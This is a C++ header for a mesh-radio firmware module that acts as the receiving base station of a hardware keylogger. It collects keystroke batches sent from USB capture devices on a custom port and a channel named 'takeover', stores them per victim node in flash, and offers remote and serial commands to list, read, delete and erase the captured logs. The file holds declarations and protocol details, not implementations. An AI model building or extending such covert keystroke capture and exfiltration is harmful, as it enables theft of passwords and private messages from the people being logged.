/**
 * @file KeylogReceiverModule.h
 * @brief Keylog receiver module for Heltec V4 base station
 *
 * Receives keystroke batches from XIAO USB capture devices via port 490,
 * stores them to flash filesystem, and sends ACK responses.
 *
 * Architecture (v7.0):
 *  - Inherits from SinglePortModule for mesh message handling
 *  - Uses LittleFS for persistent storage on ESP32 flash
 *  - Stores data in /keylogs/<node_id_hex>/keylog_<date>.txt
 *  - Sends "ACK:0x<batch_id>:!<receiver_node>" broadcasts for reliable delivery (v7.5)
 *  - Listens on channel 1 "takeover" for mesh broadcasts
 *
 * Protocol (Mesh - XIAO → Heltec):
 *  - Port: 490 (custom private port)
 *  - Channel: 1 "takeover" with PSK encryption
 *  - Incoming: [batch_id:4][data:N]
 *  - Outgoing ACK: "ACK:0x<8 hex digits>:!<8 hex node>" (v7.5 broadcast)
 *
 * Protocol (Serial - Computer → Heltec via meshtastic CLI):
 *  - Send to self: meshtastic --sendtext "LOGS:LIST" --dest !<ownNodeId> --port /dev/xxx
 *  - Commands: LOGS:LIST, LOGS:READ:<node>:<file>, LOGS:DELETE:<node>:<file>, LOGS:STATS, LOGS:ERASE_ALL
 *  - Responses: OK:* or ERR:* printed to Serial (when source is local node)
 *
 * NASA Power of 10 Compliance:
 *  - Fixed buffer sizes with compile-time bounds
 *  - Assertions for all pointer operations
 *  - No dynamic memory allocation after init
 *  - All loops have fixed upper bounds
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "configuration.h"

#ifdef KEYLOG_RECEIVER_ENABLED

#include "SinglePortModule.h"
#include "concurrency/OSThread.h"

/**
 * @brief Buffer and path size constants
 */
#define KEYLOG_MAX_PATH_LEN         64      /**< Maximum file path length */
#define KEYLOG_MAX_PAYLOAD_SIZE     512     /**< Maximum incoming payload size */
#define KEYLOG_ACK_BUFFER_SIZE      32      /**< Size for "ACK:0x12345678:!12345678\0" (v7.5) */
#define KEYLOG_BATCH_HEADER_SIZE    4       /**< batch_id is 4 bytes (old format) */
#define KEYLOG_NODE_HEX_LEN         9       /**< 8 hex chars + null */
#define KEYLOG_SERIAL_BUFFER_SIZE   128     /**< Serial command buffer size */

/**
 * @brief Protocol Version Detection (REQ-PROTO-001)
 *
 * Backwards-compatible protocol versioning using magic markers.
 * Detection logic:
 * - If bytes[0..1] == 0x55 0x4B ("UK"), it's new format v1.0+
 *   - Header: [magic:2][version:2][batch_id:4][data:N] = 8 bytes header
 * - Otherwise, it's old format (legacy)
 *   - Header: [batch_id:4][data:N] = 4 bytes header
 */
#define KEYLOG_PROTOCOL_MAGIC_0     0x55    /**< Magic byte 0 ('U') */
#define KEYLOG_PROTOCOL_MAGIC_1     0x4B    /**< Magic byte 1 ('K' for USB Keylog) */
#define KEYLOG_NEW_HEADER_SIZE      8       /**< magic(2) + version(2) + batch_id(4) */

/**
 * @brief Port and channel configuration (v7.0)
 * Must match USBCaptureModule.h settings
 */
#define KEYLOG_RECEIVER_PORTNUM     490     /**< Custom port for USB capture (private range 256-511) */
#define KEYLOG_RECEIVER_CHANNEL     1       /**< Channel 1 "takeover" for mesh broadcast */

/**
 * @brief Command handling constants
 */
#define KEYLOG_CMD_PREFIX           "LOGS:" /**< Command prefix for log access */
#define KEYLOG_CMD_PREFIX_LEN       5       /**< Length of "LOGS:" */
#define KEYLOG_RESPONSE_MAX_LEN     256     /**< Maximum single response length (legacy) */
#define KEYLOG_CHUNK_SIZE           200     /**< Max data per chunk (leaves room in 512B packet) */
#define KEYLOG_MAX_FILES_PER_NODE   32      /**< Maximum files per node directory */
#define KEYLOG_MAX_NODES            16      /**< Maximum node directories to list */

/**
 * @brief JSON response constants
 */
#define KEYLOG_JSON_MAX_LEN         4096    /**< Maximum JSON response length */
#define KEYLOG_BASE64_MAX_INPUT     2048    /**< Max file bytes before base64 (4096 * 3/4) */

/**
 * @brief Statistics tracking constants
 */
#define KEYLOG_STATS_LOG_INTERVAL_MS 60000  /**< Log stats every 60 seconds */

/**
 * @brief Deduplication cache constants
 * NASA Rule 3: Fixed sizes determined at compile time
 */
#define DEDUP_MAX_NODES        16     /**< Max concurrent sender nodes (LRU eviction) */
#define DEDUP_BATCHES_PER_NODE 16     /**< Recent batches tracked per node */
#define DEDUP_CACHE_FILE       "/keylogs/.dedup_cache"  /**< Flash persistence file */
#define DEDUP_CACHE_MAGIC      0xDEDC /**< Magic number for file validation */
#define DEDUP_CACHE_VERSION    1      /**< Format version for compatibility */
#define DEDUP_SAVE_INTERVAL_MS 30000  /**< Debounce flash writes (30 sec) */

/**
 * @brief Deduplication cache entry for one sender node
 * NASA Rule 3: Fixed-size structure, no dynamic allocation
 * NASA Rule 7: Simple struct with minimal pointer use
 *
 * Memory layout: 4 + 4 + 64 + 1 + 1 + 2 = 76 bytes per entry
 */
struct DedupNodeEntry {
    NodeNum nodeId;                                    /**< 0 = empty slot */
    uint32_t lastAccessTime;                           /**< For LRU eviction (seconds since boot) */
    uint32_t recentBatchIds[DEDUP_BATCHES_PER_NODE];   /**< Circular buffer of batch IDs */
    uint8_t nextIdx;                                   /**< Next write position in circular buffer */
    uint8_t count;                                     /**< Valid entries (0-16) */
    uint8_t padding[2];                                /**< Alignment padding */
};

/**
 * @brief Header for dedup cache file
 * NASA Rule 6: Magic number enables validation of file integrity
 */
struct DedupCacheHeader {
    uint16_t magic;      /**< DEDUP_CACHE_MAGIC for validation */
    uint16_t version;    /**< DEDUP_CACHE_VERSION for compatibility */
    uint32_t nodeCount;  /**< Number of active node entries */
};

/**
 * @brief Keylog Receiver Module for Heltec V4
 *
 * Receives keystroke batches from XIAO devices and stores to flash.
 * Implements reliable delivery via ACK responses.
 *
 * Storage Structure:
 *   /keylogs/
 *     <node_id_hex>/           e.g., /keylogs/a1b2c3d4/
 *       keylog_2025-12-13.txt  Day-based log files (append mode)
 *
 * Message Protocol:
 *  - Port: PRIVATE_APP (256)
 *  - Incoming payload: [batch_id:4][keystroke_data:N]
 *  - ACK response: "ACK:0x<batch_id_hex>"
 */
class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThread
{
  public:
    /**
     * @brief Constructor
     * Initializes SinglePortModule with PRIVATE_APP port
     */
    KeylogReceiverModule();

    /**
     * @brief Initialize the module
     * Creates /keylogs directory if it doesn't exist
     * @return true if initialization successful
     */
    bool init();

    /**
     * @brief Periodic task - checks Serial for commands
     * @return milliseconds until next call
     */
    virtual int32_t runOnce() override;

  protected:
    // ==================== MeshModule Interface ====================

    /**
     * @brief Handle received mesh packets
     * Processes incoming keystroke batches, stores to flash, sends ACK
     *
     * @param mp Received mesh packet
     * @return ProcessMessage::STOP if handled, CONTINUE otherwise
     */
    virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;

  private:
    // ==================== Storage Operations ====================

    /**
     * @brief Store keystroke batch to flash filesystem
     *
     * @param from Source node ID
     * @param batchId Batch ID for ACK correlation
     * @param data Keystroke data (after batch_id header)
     * @param len Length of keystroke data
     * @return true if stored successfully
     */
    bool storeKeystrokeBatch(NodeNum from, uint32_t batchId,
                             const uint8_t *data, size_t len);

    /**
     * @brief Ensure node directory exists
     *
     * @param nodeId Node ID to create directory for
     * @return true if directory exists or was created
     */
    bool ensureNodeDirectory(NodeNum nodeId);

    /**
     * @brief Get log file path for a node
     *
     * @param nodeId Node ID
     * @param pathBuf Output buffer for path (must be KEYLOG_MAX_PATH_LEN)
     * @return true if path was generated successfully
     */
    bool getLogFilePath(NodeNum nodeId, char *pathBuf);

    // ==================== ACK Operations ====================

    /**
     * @brief Send ACK response to sender
     *
     * @param to Destination node ID
     * @param batchId Batch ID to acknowledge
     * @return true if ACK was queued successfully
     */
    bool sendAck(NodeNum to, uint32_t batchId);

    // ==================== Command Handling ====================

    /**
     * @brief Handle LOGS:* commands for remote keylog access
     *
     * Commands supported:
     *  - LOGS:LIST - List all nodes and their log files
     *  - LOGS:READ:<node>:<filename> - Read file contents (chunked)
     *  - LOGS:DELETE:<node>:<filename> - Delete a log file
     *  - LOGS:STATS - Get storage statistics
     *
     * @param from Source node to respond to
     * @param cmd Command string (after "LOGS:" prefix)
     * @param len Length of command string
     * @return ProcessMessage::STOP if handled
     */
    ProcessMessage handleLogsCommand(NodeNum from, const char *cmd, size_t len);

    /**
     * @brief Handle LOGS:LIST command
     * Lists all node directories and their log files
     *
     * @param from Node to send response to
     * @return true if response sent successfully
     */
    bool handleListCommand(NodeNum from);

    /**
     * @brief Handle LOGS:READ command
     * Reads file and sends contents in chunks
     *
     * @param from Node to send response to
     * @param node Node ID (hex string, 8 chars)
     * @param filename Filename to read
     * @return true if file was read and sent
     */
    bool handleReadCommand(NodeNum from, const char *node, const char *filename);

    /**
     * @brief Handle LOGS:DELETE command
     * Deletes specified log file
     *
     * @param from Node to send response to
     * @param node Node ID (hex string, 8 chars)
     * @param filename Filename to delete
     * @return true if file was deleted
     */
    bool handleDeleteCommand(NodeNum from, const char *node, const char *filename);

    /**
     * @brief Handle LOGS:STATS command
     * Returns storage statistics
     *
     * @param from Node to send response to
     * @return true if stats sent successfully
     */
    bool handleStatsCommand(NodeNum from);

    /**
     * @brief Handle LOGS:ERASE_ALL command
     * Deletes ALL keylog files from ALL nodes
     *
     * @param from Node to send response to
     * @return true if erase operation completed
     */
    bool handleEraseAllCommand(NodeNum from);

    /**
     * @brief Send text response to a node
     *
     * @param to Destination node ID
     * @param response Response string (null-terminated)
     * @return true if response was queued
     */
    bool sendResponse(NodeNum to, const char *response);

    /**
     * @brief Send file contents in chunks (legacy, for mesh responses)
     *
     * @param to Destination node ID
     * @param path File path to read
     * @return true if all chunks sent
     */
    bool sendFileChunks(NodeNum to, const char *path);

    // ==================== JSON Helpers ====================

    /**
     * @brief Escape a string for JSON output
     *
     * @param input Source string
     * @param output Output buffer
     * @param outLen Output buffer size
     * @return Length written (excluding null terminator)
     */
    size_t jsonEscapeString(const char *input, char *output, size_t outLen);

    /**
     * @brief Base64 encode binary data
     *
     * @param input Input bytes
     * @param inputLen Input length
     * @param output Output buffer (must be at least ((inputLen + 2) / 3) * 4 + 1)
     * @param outLen Output buffer size
     * @return Length written (excluding null terminator)
     */
    size_t base64Encode(const uint8_t *input, size_t inputLen, char *output, size_t outLen);

    // ==================== Serial Command Handling ====================

    /**
     * @brief Check Serial for incoming text commands
     * Reads line from Serial, parses LOGS:* commands, writes JSON response
     */
    void checkSerialCommands();

    /**
     * @brief Handle a serial command (same as mesh but response goes to Serial)
     *
     * @param cmd Full command string (including "LOGS:" prefix)
     * @param len Command string length
     */
    void handleSerialCommand(const char *cmd, size_t len);

    /**
     * @brief Send response directly to Serial (not mesh)
     * @param response JSON response string
     */
    void sendSerialResponse(const char *response);

    // ==================== Statistics ====================

    uint32_t totalBatchesReceived;  /**< Total batches received */
    uint32_t totalBatchesStored;    /**< Batches successfully stored */
    uint32_t totalAcksSent;         /**< ACKs successfully sent */
    uint32_t storageErrors;         /**< Storage operation failures */
    uint32_t lastStatsLog;          /**< Last stats log timestamp */

    // ==================== Serial Command State ====================

    char serialCmdBuffer[KEYLOG_SERIAL_BUFFER_SIZE];  /**< Buffer for serial commands */
    size_t serialCmdLen;                               /**< Current command buffer length */
    bool serialResponsePending;                        /**< Flag to indicate serial response mode */

    // ==================== Deduplication Cache ====================
    // NASA Rule 3: Fixed-size array, no dynamic allocation
    // NASA Rule 7: Single-level pointer access only

    DedupNodeEntry dedupCache[DEDUP_MAX_NODES];  /**< Per-node dedup tracking */
    uint32_t duplicatesDetected;                  /**< Stats: duplicate batches rejected */
    uint32_t lastDedupSave;                       /**< Timestamp of last flash save */
    bool dedupCacheDirty;                         /**< True if cache needs saving */

    // ==================== Deduplication Methods ====================

    /**
     * @brief Check if batch was already received from this node
     * NASA Rule 1: No recursion, simple control flow
     * NASA Rule 2: Fixed loop bounds (DEDUP_MAX_NODES, DEDUP_BATCHES_PER_NODE)
     *
     * @param from Source node ID
     * @param batchId Batch ID to check
     * @return true if duplicate (already received), false if new
     */
    bool isDuplicateBatch(NodeNum from, uint32_t batchId);

    /**
     * @brief Record a received batch in the dedup cache
     * NASA Rule 3: No dynamic allocation (uses fixed cache)
     * NASA Rule 5: Variables at smallest scope
     *
     * @param from Source node ID
     * @param batchId Batch ID to record
     */
    void recordReceivedBatch(NodeNum from, uint32_t batchId);

    /**
     * @brief Find existing node entry or create new one (LRU eviction if full)
     * NASA Rule 1: No recursion
     * NASA Rule 2: Fixed loop bounds
     * NASA Rule 7: Returns pointer to static array element (no heap)
     *
     * @param nodeId Node ID to find or create entry for
     * @return Pointer to node entry (never null - uses LRU eviction)
     */
    DedupNodeEntry* findOrCreateNodeEntry(NodeNum nodeId);

    /**
     * @brief Load dedup cache from flash filesystem
     * NASA Rule 6: All return values checked
     * NASA Rule 3: Uses fixed-size buffer (no heap)
     *
     * @return true if cache loaded successfully, false for fresh start
     */
    bool loadDedupCache();

    /**
     * @brief Save dedup cache to flash filesystem
     * NASA Rule 6: All return values checked
     * NASA Rule 2: Fixed loop bound for counting nodes
     *
     * @return true if saved successfully
     */
    bool saveDedupCache();

    /**
     * @brief Save cache if dirty and debounce interval elapsed
     * NASA Rule 1: Simple control flow (early returns)
     */
    void saveDedupCacheIfNeeded();
};

extern KeylogReceiverModule *keylogReceiverModule;

#endif /* KEYLOG_RECEIVER_ENABLED */
